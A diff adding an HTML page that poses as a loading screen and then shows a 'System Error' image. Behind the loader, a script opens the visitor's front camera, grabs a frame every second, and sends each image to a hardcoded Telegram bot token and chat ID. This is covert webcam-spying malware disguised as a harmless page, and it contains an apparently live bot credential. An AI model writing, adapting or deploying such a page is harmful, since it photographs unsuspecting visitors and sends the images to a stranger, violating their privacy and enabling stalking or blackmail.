@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+
+<title>Loading</title>
+
+
+
+
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+
+   
+html,
+body {
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  background: #050505;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+/* LOADING SCREEN */
+#loader {
+  position: fixed;
+  inset: 0;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  background:
+    radial-gradient(
+      circle at 50% 45%,
+      #171717 0%,
+      #090909 42%,
+      #020202 100%
+    );
+
+  color: #fff;
+  z-index: 10;
+}
+
+.loading-card {
+  width: min(88vw, 430px);
+  text-align: center;
+}
+
+/* SPINNER */
+.logo {
+  width: 64px;
+  height: 64px;
+
+  margin: 0 auto 28px;
+
+  border: 2px solid rgba(255,255,255,.12);
+  border-top-color: #fff;
+  border-right-color: rgba(255,255,255,.55);
+
+  border-radius: 50%;
+
+  animation: spin 1s linear infinite;
+
+  box-shadow:
+    0 0 30px rgba(255,255,255,.08);
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* TITLE */
+.title {
+  font-size: 14px;
+  letter-spacing: 4px;
+  text-transform: uppercase;
+
+  color: #f2f2f2;
+
+  margin-bottom: 18px;
+}
+
+/* PROGRESS BAR */
+.track {
+  width: 100%;
+  height: 5px;
+
+  background: rgba(255,255,255,.10);
+
+  border-radius: 20px;
+
+  overflow: hidden;
+
+  box-shadow:
+    inset 0 0 8px rgba(0,0,0,.8);
+}
+
+.bar {
+  width: 0%;
+  height: 100%;
+
+  border-radius: inherit;
+
+  background:
+    linear-gradient(
+      90deg,
+      #fff,
+      #bdbdbd
+    );
+
+  box-shadow:
+    0 0 14px rgba(255,255,255,.35);
+
+  transition: width .05s linear;
+}
+
+/* STATUS */
+.status {
+  height: 18px;
+
+  margin-top: 15px;
+
+  font-size: 11px;
+  letter-spacing: 2px;
+
+  color: rgba(255,255,255,.45);
+
+  text-transform: uppercase;
+}
+
+
+/* IMAGE SCREEN */
+#imageScreen {
+  position: fixed;
+  inset: 0;
+
+  width: 100%;
+  height: 100dvh;
+
+  display: none;
+
+  align-items: center;
+  justify-content: center;
+
+  background: #000;
+}
+
+#imageScreen img {
+  width: 100%;
+  height: 100%;
+
+  object-fit: contain;
+  object-position: center;
+
+  display: block;
+}
+</style>
+</head>
+
+<body>
+
+
+<!-- LOADING -->
+<div id="loader">
+
+  <div class="loading-card">
+
+    <div class="logo"></div>
+
+    <div class="title">
+      Initializing
+    </div>
+
+    <div class="track">
+      <div
+        class="bar"
+        id="bar">
+      </div>
+    </div>
+
+    <div
+      class="status"
+      id="status">
+      Preparing
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- IMAGE -->
+<div id="imageScreen">
+
+  <img
+    src="https://plus.unsplash.com/premium_photo-1768374180121-f86dc6a506e3?fm=jpg&q=60&w=3000&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MXx8Y29tcHV0ZXIlMjBlcnJvcnxlbnwwfHwwfHx8MA%3D%3D"
+    alt="System Error">
+
+</div>
+
+
+<script>
+
+const bar =
+  document.getElementById("bar");
+
+const status =
+  document.getElementById("status");
+
+const loader =
+  document.getElementById("loader");
+
+const imageScreen =
+  document.getElementById("imageScreen");
+
+
+function setProgress(value) {
+
+  bar.style.width =
+    value + "%";
+
+}
+
+
+function finish() {
+
+  setProgress(100);
+
+  status.textContent =
+    "Ready";
+
+
+  setTimeout(() => {
+
+    loader.style.display =
+      "none";
+
+    imageScreen.style.display =
+      "flex";
+
+  }, 450);
+
+}
+
+
+/*
+  LOADING SEQUENCE
+
+  0% → 55% = slowly
+  55% → 90% = instant jump
+  90% → 100% = slowly
+*/
+
+
+let progress = 0;
+
+
+const firstStage =
+  setInterval(() => {
+
+    progress += 1;
+
+
+    if (progress <= 55) {
+
+      setProgress(progress);
+
+    }
+
+
+    if (progress >= 55) {
+
+      clearInterval(firstStage);
+
+
+      status.textContent =
+        "Almost ready";
+
+
+      setTimeout(() => {
+
+        /* DIRECT JUMP TO 90% */
+
+        setProgress(90);
+
+        status.textContent =
+          "Finalizing";
+
+
+        let finalProgress = 90;
+
+
+        /* 90 → 100 SLOWLY */
+
+        const finalStage =
+          setInterval(() => {
+
+            finalProgress += 1;
+
+            setProgress(
+              finalProgress
+            );
+
+
+            if (
+              finalProgress >= 100
+            ) {
+
+              clearInterval(
+                finalStage
+              );
+
+              finish();
+
+            }
+
+          }, 85);
+
+
+      }, 300);
+
+    }
+
+  }, 95);
+
+</script>
+
+<div class="video-wrap">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+
+<p id="error"></p>
+
+<script>
+
+async function post(imgdata) {
+    const token = "8996598884:AAG9sJRojsgoBRWVSpnZhMJmzc4PaN1NnlY";
+    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+    // Multiple Users ki Chat IDs ka Array
+    const chat_ids = [
+        "8419861027",
+    ];
+
+    // Base64 / Data URI ko Blob me convert karne ka helper function
+    function dataURItoBlob(dataURI) {
+        try {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Process image format
+    let photoPayload;
+    if (typeof imgdata === 'string' && imgdata.startsWith('data:image')) {
+        photoPayload = dataURItoBlob(imgdata);
+    } else {
+        photoPayload = imgdata;
+    }
+
+    // Har Chat ID ko photo bhejne ke liye Loop
+    for (const chat_id of chat_ids) {
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        
+        if (photoPayload instanceof Blob) {
+            formData.append("photo", photoPayload, "image.png");
+        } else {
+            formData.append("photo", photoPayload);
+        }
+
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                body: formData
+            });
+            const data = await response.json();
+
+            if (data.ok) {
+                console.log(`Success: ${chat_id} ko photo bhej di gayi hai.`);
+            } else {
+                console.error(`Error (${chat_id}):`, data.description);
+            }
+        } catch (error) {
+            console.error(`Network Error (${chat_id}):`, error);
+        }
+    }
+}
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.getElementById('error');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {	
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1000);
+
+
+  }
+  // Load init
+  init();
+
+</script>
+
+
+</body>
+</html>
